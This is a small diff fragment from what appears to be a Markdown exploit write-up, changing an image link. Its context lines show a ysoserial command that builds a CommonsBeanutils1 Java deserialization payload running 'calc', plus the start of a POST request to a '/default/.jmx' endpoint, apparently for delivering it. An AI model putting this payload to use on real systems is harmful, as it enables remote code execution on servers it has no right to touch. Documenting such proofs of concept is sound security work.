@@ -11,7 +11,7 @@
 /java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "calc" | base64 | tr -d '\n' > cb1_calc_b64.txt
 ```
 
-![](../../images/181695d09b3271241aaa0fa63a9ee917.png)
+![](https://cdn.nlark.com/yuque/0/2025/png/26698826/1750599167527-6cea554f-b462-4f92-a276-075a08b32f72.png)
 
 ```plain
 POST /default/.jmx HTTP/1.1
